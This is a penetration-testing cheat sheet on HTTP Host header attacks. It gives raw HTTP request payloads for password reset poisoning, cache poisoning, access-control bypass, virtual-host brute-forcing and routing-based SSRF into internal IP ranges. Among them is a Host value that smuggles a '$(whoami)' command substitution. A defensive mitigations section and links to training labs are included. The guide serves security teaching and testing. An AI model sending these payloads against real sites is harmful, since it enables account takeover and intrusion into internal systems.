# HTTP Host Header Attacks

HTTP Host header attacks abuse applications, caches, reverse proxies, and load balancers that trust a user-controlled host value for routing, URL generation, access control, caching, or server-side requests. In modern deployments, the `Host` header often influences far more than simple virtual hosting, which makes host handling bugs a useful entry point for account takeover, cache poisoning, access-control bypass, and routing-based SSRF.

## Summary

- [Tools](#tools)
- [Methodology](#methodology)
  - [Recon and discovery](#recon-and-discovery)
  - [Bypassing validation](#bypassing-validation)
  - [Host override headers](#host-override-headers)
  - [Password reset poisoning](#password-reset-poisoning)
  - [Absolute URL poisoning and link generation abuse](#absolute-url-poisoning-and-link-generation-abuse)
  - [Web cache poisoning](#web-cache-poisoning)
  - [Authentication and access-control bypass](#authentication-and-access-control-bypass)
  - [Virtual host brute-forcing](#virtual-host-brute-forcing)
  - [Routing-based SSRF](#routing-based-ssrf)
  - [Connection state attacks](#connection-state-attacks)
  - [SSRF via flawed request parsing](#ssrf-via-flawed-request-parsing)
  - [Classic server-side injection points](#classic-server-side-injection-points)
  - [Framework and reverse-proxy notes](#framework-and-reverse-proxy-notes)
  - [Defensive guidance](#defensive-guidance)
- [Labs](#labs)
- [References](#references)

## Tools

- [PortSwigger Burp Suite](https://portswigger.net/burp) - Intercept, replay, compare, and automate Host-header test cases.
- [PortSwigger Param Miner](https://github.com/PortSwigger/param-miner) - Useful for discovering hidden host override headers.
- [ffuf](https://github.com/ffuf/ffuf) - Fast vhost brute-forcing with custom `Host` headers.
- [httpx](https://github.com/projectdiscovery/httpx) - Probe targets and compare responses across host variations.
- [curl](https://curl.se/) - Quick request crafting for simple header and absolute-URL tests.
- [Ncat](https://nmap.org/ncat/) - Useful when you need raw control over malformed or ambiguous HTTP requests.
- [OpenSSL](https://www.openssl.org/) - Helpful for manual TLS connections and low-level request crafting.

## Methodology

### Recon and discovery

The first goal is to learn whether the target still routes requests when the `Host` header is changed. If the application remains reachable with an arbitrary or malformed host value, look for any behavior that depends on that value.

Start with a normal request and replay it with an attacker-controlled host.

```http
GET / HTTP/1.1
Host: [REDACTED]
```

Useful indicators include:

- Absolute URLs in redirects, emails, password reset links, canonical tags, or API responses.
- Reflection of the supplied host in HTML, JavaScript imports, JSON, or metadata.
- Different responses when using unknown hosts, duplicate `Host` headers, or host override headers.
- Cache headers that suggest application-level or intermediary caching.
- Error messages that reveal internal hosts, routing tiers, or fallback behavior.

Common places where the host value influences behavior:

- Password reset and email verification flows.
- Redirects and absolute link generation.
- Multi-tenant routing.
- Admin or internal-only functionality.
- Reverse-proxy routing.
- Logging, analytics, or server-side fetches.

### Bypassing validation

Applications frequently validate only the expected hostname while parsing the full host value differently in another component. Try variants that preserve routing while changing what another parser sees.

#### Add a port

Some parsers validate only the hostname and ignore the port. Others later consume the whole value.

```http
GET / HTTP/1.1
Host: vulnerable-website.com:8080
```

Try non-standard or parser-confusing values when you have evidence that a port is not normalized consistently.

```http
GET / HTTP/1.1
Host: vulnerable-website.com:bad-stuff
```

#### Duplicate `Host` headers

Front-end and back-end systems may disagree on which `Host` header wins.

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Host: [REDACTED]
```

#### Wrapped or ambiguous headers

Whitespace and malformed formatting can trigger parser differences.

```http
GET / HTTP/1.1
Host: vulnerable-website.com
 Host: [REDACTED]
```

#### Absolute-form request targets

Some systems validate the host in the absolute URL but route or process the request based on another field.

```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: [REDACTED]
```

### Host override headers

Even when direct `Host` manipulation is blocked, many stacks still trust override headers introduced for proxying or forwarding.

Probe the following headers one by one and compare behavior:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: [REDACTED]
```

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Host: [REDACTED]
```

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Server: [REDACTED]
```

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-HTTP-Host-Override: [REDACTED]
```

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Forwarded: host=[REDACTED]
```

When available, use Param Miner to guess hidden or framework-specific headers.

### Password reset poisoning

A classic Host-header issue appears when an application builds password reset links from the request host instead of a configured canonical domain. If the victim receives a reset email containing an attacker-controlled domain, the reset token can be leaked to attacker infrastructure.

#### Testing steps

1. Trigger a password reset for your own account and inspect the resulting email.
2. Identify whether the absolute reset URL uses request-derived host information.
3. Replay the password reset request with a malicious `Host` or `X-Forwarded-Host` value.
4. Confirm whether the outbound email now references your supplied domain.

Example request:

```http
POST /forgot-password HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded

username=User
```

Impact ranges from token leakage to full account takeover.

### Absolute URL poisoning and link generation abuse

Applications often reuse the current host for redirects, email templates, canonical URLs, passwordless login links, SSO return paths, and static asset URLs. Even when account takeover is not possible, these behaviors can enable phishing, token leakage, brand impersonation, or content injection if downstream systems fetch attacker-controlled URLs.

Look for these sinks:

- `Location` headers.
- Password reset and email verification links.
- `og:url`, canonical tags, and sitemap generation.
- Script, stylesheet, image, and API endpoint imports built as absolute URLs.
- Invite links, deep links, and magic-login URLs.

Simple example:

```http
GET /login HTTP/1.1
Host: [REDACTED]
```

If the response contains attacker-controlled absolute URLs, escalate into redirect abuse, phishing, token theft, or cache poisoning depending on the context.

### Web cache poisoning

A bare reflected Host-header issue is often not directly exploitable because browsers set the `Host` header themselves. The situation changes when a cache stores the poisoned response and serves it to normal users.

A practical workflow is:

1. Find a response that reflects host-derived data.
2. Determine whether the poisoned value affects a cacheable response.
3. Learn the cache key. In many cases, the cache key will differ from the host parsing logic.
4. Use ambiguous requests or override headers so the cache and application disagree.
5. Trigger a cache hit with a malicious response.

Useful probe:

```http
GET /?cb=123 HTTP/1.1
Host: vulnerable-website.com
Host: [REDACTED]
```

Typical outcomes:

- Poisoned JavaScript imports.
- Persistent redirect poisoning.
- Stored XSS via host-derived markup.
- Defacement or content substitution.

### Authentication and access-control bypass

Some applications assume that requests for `localhost`, an intranet hostname, or a trusted reverse-proxy name are internal. If this trust is based on `Host` rather than network position, changing the header may expose admin features.

Try common internal values:

```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin HTTP/1.1
Host: 127.0.0.1
```

```http
GET /admin HTTP/1.1
Host: intranet.example.com
```

Good reconnaissance targets include:

- `/admin`
- `/robots.txt`
- `/debug`
- `/internal`
- `/actuator`
- Management or health endpoints

If the application responds differently for internal hostnames, you may gain access to hidden attack surface or privileged actions.

### Virtual host brute-forcing

Public and internal applications are sometimes hosted on the same server or behind the same front-end. If you can reach the server, guessing additional virtual hosts may expose undocumented sites.

Example with `ffuf`:

```bash
ffuf -w subdomains.txt -u https://vulnerable-website.com/ -H "Host: FUZZ.example.com" -fs 0
```

Example with `curl`:

```bash
while read h; do
  curl -sk https://vulnerable-website.com/ -H "Host: ${h}.example.com" | head
done < subdomains.txt
```

Watch for changes in:

- Status code.
- Content length.
- Titles and favicons.
- Security headers.
- Redirect destinations.
- TLS and HSTS behavior.

This technique becomes much more useful when you already have naming clues from certificates, JavaScript, emails, or error messages.

### Routing-based SSRF

Modern front-ends often choose a back-end target based on the host value. If a reverse proxy or load balancer forwards requests using an unvalidated host, the host header becomes a routing primitive rather than a simple application input.

This enables high-impact SSRF against internal services.

#### Confirm external routing

First, test whether the middleware performs outbound DNS or HTTP requests for an attacker-controlled host.

```http
GET / HTTP/1.1
Host: [REDACTED]
```

A DNS or HTTP interaction with your controlled endpoint suggests host-based routing.

#### Pivot to internal IP space

Once confirmed, replace the host with internal IP ranges or discovered internal names.

```http
GET / HTTP/1.1
Host: 192.168.0.10
```

```http
GET /admin HTTP/1.1
Host: 10.10.10.10
```

Use differential responses, redirects, timing, and content signatures to identify internal systems.

### Connection state attacks

Some front-ends make routing decisions once per TCP connection, then reuse that state for later requests on the same socket. In these cases, a valid first request can establish a trusted route, and a later request on the same connection may inherit that routing context even with a blocked or unexpected host.

These issues are closely related to parsing discrepancies and request desynchronization. They are not always reproducible with basic tooling, so raw socket control or modern Burp features may be needed.

High-level testing approach:

1. Send a valid request that establishes a normal route.
2. Reuse the same connection.
3. Send a second request containing a changed or internal host target.
4. Compare behavior to the same request over a fresh connection.

### SSRF via flawed request parsing

Some systems parse the intended host from the absolute request target instead of the `Host` header, or validate one while routing based on the other. This can create SSRF even when straightforward host tampering appears blocked.

Example:

```http
GET https://192.168.0.10/admin HTTP/1.1
Host: vulnerable-website.com
```

If the front-end validates `Host` but the middleware routes using the absolute target, you may be able to reach internal systems. Compare:

```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: vulnerable-website.com
```

and:

```http
GET https://10.10.10.10/ HTTP/1.1
Host: vulnerable-website.com
```

This class of issue often appears around proxies, framework middleware, and custom request normalization logic.

### Classic server-side injection points

Do not stop at business-logic bugs. A host value can flow into SQL queries, template contexts, log pipelines, XML, or shell commands. Where the application stores or reuses the supplied host, standard server-side probes may apply.

Examples:

```http
GET / HTTP/1.1
Host: vulnerable-website.com'
```

```http
GET / HTTP/1.1
Host: {{7*7}}
```

```http
GET / HTTP/1.1
Host: $(whoami)
```

These are only initial probes. Exploitability depends entirely on where the value is consumed.

### Framework and reverse-proxy notes

Host-header issues often come from architecture rather than a single coding bug. Common patterns include:

- Reverse proxies trusting unvalidated hosts for routing.
- Frameworks preferring `X-Forwarded-Host` or similar headers when proxy support is enabled.
- Internal-only vhosts sharing infrastructure with public applications.
- Applications building absolute URLs dynamically because no canonical external hostname was configured.

For example, Django provides `ALLOWED_HOSTS` specifically to restrict accepted hosts. Similar controls should be configured for the entire chain, not just the application.

### Defensive guidance

The safest pattern is to avoid using request-derived host information in security-sensitive server-side logic.

Recommended mitigations:

- Configure a canonical external hostname and use it for absolute URLs.
- Validate `Host` against an allowlist and reject unknown hosts.
- Disable or strictly control override headers such as `X-Forwarded-Host` unless they are required and sanitized by trusted proxies.
- Do not host internal-only applications on the same front-end as public sites when virtual hosting is in use.
- Restrict reverse-proxy routing to known upstreams only.
- Make cache keys and application parsing consistent.
- Review redirects, emails, password reset flows, OAuth callbacks, and SSO links for host-derived URL generation.
- Log and alert on unexpected hosts reaching public entry points.

## Labs

- [HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)
- [Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)
- [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)
- [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)
- [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)
- [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

## References

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Web Security Academy. Accessed April 10, 2026.
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/host-header) - HTTP Host header attacks. Accessed April 10, 2026.
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/host-header/exploiting) - How to identify and exploit HTTP Host header vulnerabilities. Accessed April 10, 2026.
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) - Password reset poisoning. Accessed April 10, 2026.
- [James Kettle](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface) - Cracking the lens: targeting HTTP's hidden attack-surface. July 27, 2017.
- [James Kettle](https://portswigger.net/research/practical-web-cache-poisoning) - Practical Web Cache Poisoning. August 9, 2018.
- [PortSwigger/param-miner](https://github.com/PortSwigger/param-miner) - Burp extension for guessing headers, parameters, and hidden input vectors.
- [ffuf/ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer for content, parameter, and virtual-host discovery.
